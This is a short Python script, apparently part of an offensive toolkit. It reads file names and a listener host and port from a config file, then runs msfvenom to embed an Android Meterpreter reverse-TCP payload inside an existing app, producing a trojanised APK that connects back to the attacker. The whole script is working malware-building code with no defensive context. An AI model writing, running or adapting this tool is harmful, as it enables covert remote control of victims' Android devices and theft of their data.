import os
from configparser import ConfigParser

parser = ConfigParser()
if os.path.isfile('../config_payload.ini'):
    parser.read('../config_payload.ini')
    Original = "../"
    Payload = "../"
elif os.path.isfile('config_payload.ini'):
    parser.read('config_payload.ini')
    Original = ""
    Payload = ""
else:
    raise SystemExit


Original = Original + parser.get('Filename','Original')
Payload = Payload + parser.get('Filename','Payload')
Listen_Host = parser.get('Payload','Listen_Host')
Listen_Port = parser.get('Payload','Listen_Port')

command = "msfvenom -x " + Original + " -p android/meterpreter/reverse_tcp LHOST=" + Listen_Host + " LPORT=" + Listen_Port + " R > " + Payload

os.system(command)
